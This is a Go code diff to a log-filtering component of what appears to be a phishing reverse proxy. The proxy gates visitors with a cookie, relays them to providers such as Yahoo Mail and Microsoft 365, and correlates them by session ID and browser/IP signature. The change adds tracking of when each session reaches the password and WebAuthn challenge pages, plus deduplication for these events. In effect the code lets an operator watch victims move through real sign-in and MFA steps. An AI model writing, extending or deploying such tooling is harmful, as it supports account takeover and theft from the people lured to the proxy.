@@ -20,6 +20,7 @@ type consoleLogWriter struct {
 const (
 	visitorLogDedupeWindow = 5 * time.Minute
 	blockedLogDedupeWindow = 10 * time.Second
+	stepLogDedupeWindow    = 2 * time.Minute
 )
 
 type visitorLogEntry struct {
@@ -35,25 +36,24 @@ var compactConsoleState = struct {
 	sidByIndex          map[string]string
 	providerSeen        map[string]time.Time
 	blockedSeen         map[string]time.Time
+	stepSeen            map[string]time.Time
 }{
 	visitors:     make(map[string]visitorLogEntry),
 	sidByIndex:   make(map[string]string),
 	providerSeen: make(map[string]time.Time),
 	blockedSeen:  make(map[string]time.Time),
+	stepSeen:     make(map[string]time.Time),
 }
 
 func installCompactConsole() {
 	originalStdout := os.Stdout
 
-	// Route fmt.Print/Printf output through the same compact filter.
 	reader, writer, err := os.Pipe()
 	if err == nil {
 		os.Stdout = writer
 		go filterStdout(reader, originalStdout)
 	}
 
-	// The standard log package normally writes to stderr. Send it through the
-	// compact filter and then to the original stdout so PM2 gets one stream.
 	log.SetOutput(&consoleLogWriter{dst: originalStdout})
 }
 
@@ -87,8 +87,6 @@ func filterStdout(reader *os.File, dst io.Writer) {
 				id = fields[0]
 			}
 
-			// Everything after the generated session ID is the existing browser/IP
-			// signature. This is used only to collapse duplicate console events.
 			visitorKey := strings.TrimSpace(rest)
 			if id != "" {
 				visitorKey = strings.TrimSpace(strings.TrimPrefix(visitorKey, id))
@@ -115,6 +113,11 @@ func filterStdout(reader *os.File, dst io.Writer) {
 			for key, lastSeen := range compactConsoleState.blockedSeen {
 				if now.Sub(lastSeen) >= blockedLogDedupeWindow {
 					delete(compactConsoleState.blockedSeen, key)
+				}
+			}
+			for key, lastSeen := range compactConsoleState.stepSeen {
+				if now.Sub(lastSeen) >= stepLogDedupeWindow {
+					delete(compactConsoleState.stepSeen, key)
 				}
 			}
 
@@ -158,8 +161,6 @@ func filterStdout(reader *os.File, dst io.Writer) {
 			continue
 		}
 
-		// stdout is mostly banners, response dumps, and decorative diagnostics.
-		// Keep only explicit operational problems.
 		upper := strings.ToUpper(line)
 		if strings.Contains(upper, "[!] ") ||
 			strings.Contains(upper, "[ERROR]") ||
@@ -173,9 +174,6 @@ func filterStdout(reader *os.File, dst io.Writer) {
 func compactLogLine(line string) (string, bool) {
 	lower := strings.ToLower(line)
 
-	// Entry-subdomain requests without the gate/session cookie are explicitly
-	// denied by Prism and redirected back to the verification host. Report that
-	// as BLOCKED instead of making it look like the provider was reached.
 	if strings.Contains(lower, "no gate cookie") {
 		host := fieldBetween(line, "[→] [", "] no gate cookie")
 		host = stripLogPort(host)
@@ -198,9 +196,6 @@ func compactLogLine(line string) (string, bool) {
 		return prefix + "🛑 BLOCKED   •  Unverified  •  " + providerDisplayName(host), true
 	}
 
-	// Root request debug lines are used only as correlation hints. We delay the
-	// verification event until a session ID exists, and provider output comes
-	// from the indexed request trace below.
 	if strings.Contains(line, "Request reached Go!") {
 		host := fieldBetween(line, "Host: ", " | Path:")
 		path := fieldBetween(line, "Path: ", " | Method:")
@@ -217,27 +212,57 @@ func compactLogLine(line string) (string, bool) {
 		return "", false
 	}
 
-	// The existing indexed request trace gives us the provider + internal
-	// session index. Convert only root GET navigations that already correlate to
-	// a canonical visible SID. Uncorrelated provider requests stay silent.
 	if strings.Contains(line, "[>] [") {
-		index, host, ok := indexedRootGET(line)
-		if !ok || strings.HasPrefix(strings.ToLower(host), "go.") {
+		index, host, path, ok := indexedGET(line)
+		if !ok {
 			return "", false
 		}
 
-		provider := providerDisplayName(host)
 		prefix := prefixBefore(line, "[>] [")
 
 		compactConsoleState.Lock()
 		sid := compactConsoleState.sidByIndex[index]
+		compactConsoleState.Unlock()
+
 		if sid == "" {
-			compactConsoleState.Unlock()
 			return "", false
 		}
 
+		// Log the next authentication screen reached after the user continues.
+		// Query strings are not present in the existing request trace, so the
+		// route path itself is the stable signal for these __eg_handoff pages.
+		stepLabel := ""
+		switch path {
+		case "/account/challenge/password":
+			stepLabel = "Password challenge"
+		case "/account/challenge/web-authn":
+			stepLabel = "WebAuthn challenge"
+		}
+
+		if stepLabel != "" {
+			key := sid + "|" + path
+			now := time.Now()
+
+			compactConsoleState.Lock()
+			if lastSeen, exists := compactConsoleState.stepSeen[key]; exists && now.Sub(lastSeen) < stepLogDedupeWindow {
+				compactConsoleState.Unlock()
+				return "", false
+			}
+			compactConsoleState.stepSeen[key] = now
+			compactConsoleState.Unlock()
+
+			return prefix + "➡️ STEP      •  SID " + sid + "  •  " + stepLabel, true
+		}
+
+		if path != "/" || strings.HasPrefix(strings.ToLower(host), "go.") {
+			return "", false
+		}
+
+		provider := providerDisplayName(host)
 		key := sid + "|" + provider
 		now := time.Now()
+
+		compactConsoleState.Lock()
 		if lastSeen, exists := compactConsoleState.providerSeen[key]; exists && now.Sub(lastSeen) < visitorLogDedupeWindow {
 			compactConsoleState.Unlock()
 			return "", false
@@ -248,7 +273,6 @@ func compactLogLine(line string) (string, bool) {
 		return prefix + "📨 PROVIDER  •  SID " + sid + "  •  " + provider, true
 	}
 
-	// Keep other explicit block decisions visible.
 	if strings.Contains(line, "[⛔] BLOCKED:") || strings.Contains(line, "[x] BLOCKED:") {
 		reason := strings.TrimSpace(fieldAfter(line, "BLOCKED:"))
 		prefix := ""
@@ -263,14 +287,12 @@ func compactLogLine(line string) (string, bool) {
 		return prefix + "🛑 BLOCKED   •  " + reason, true
 	}
 
-	// Startup/configuration lines are low volume and useful.
 	if strings.Contains(line, "Listening on ") ||
 		strings.Contains(line, "Advanced correlation engine started") ||
 		strings.Contains(line, "[config]") {
 		return line, true
 	}
 
-	// Keep actionable warnings and failures.
 	if strings.Contains(line, "[!] ") ||
 		strings.Contains(lower, "error") ||
 		strings.Contains(lower, "failed") ||
@@ -281,52 +303,52 @@ func compactLogLine(line string) (string, bool) {
 	return "", false
 }
 
-func indexedRootGET(line string) (string, string, bool) {
+func indexedGET(line string) (string, string, string, bool) {
 	marker := "[>] ["
 	i := strings.Index(line, marker)
 	if i < 0 {
-		return "", "", false
+		return "", "", "", false
 	}
 
 	rest := line[i+len(marker):]
 	endIndex := strings.Index(rest, "]")
 	if endIndex < 0 {
-		return "", "", false
+		return "", "", "", false
 	}
 	index := strings.TrimSpace(rest[:endIndex])
 	rest = strings.TrimSpace(rest[endIndex+1:])
 
-	// Skip the target label: [Yahoo Mail], [Microsoft 365], etc.
 	if !strings.HasPrefix(rest, "[") {
-		return "", "", false
+		return "", "", "", false
 	}
 	endTarget := strings.Index(rest, "]")
 	if endTarget < 0 {
-		return "", "", false
+		return "", "", "", false
 	}
 	rest = strings.TrimSpace(rest[endTarget+1:])
 
 	if !strings.HasPrefix(rest, "GET ") {
-		return "", "", false
+		return "", "", "", false
 	}
 	rest = strings.TrimSpace(strings.TrimPrefix(rest, "GET "))
 	fields := strings.Fields(rest)
 	if len(fields) == 0 {
-		return "", "", false
+		return "", "", "", false
 	}
 
 	hostPath := fields[0]
 	slash := strings.Index(hostPath, "/")
 	if slash < 0 {
-		return "", "", false
-	}
-	host := hostPath[:slash]
-	path := hostPath[slash:]
-	if path != "/" {
-		return "", "", false
+		return "", "", "", false
 	}
 
-	return index, host, true
+	host := hostPath[:slash]
+	path := hostPath[slash:]
+	if q := strings.IndexByte(path, '?'); q >= 0 {
+		path = path[:q]
+	}
+
+	return index, host, path, true
 }
 
 func prefixBefore(s, marker string) string {
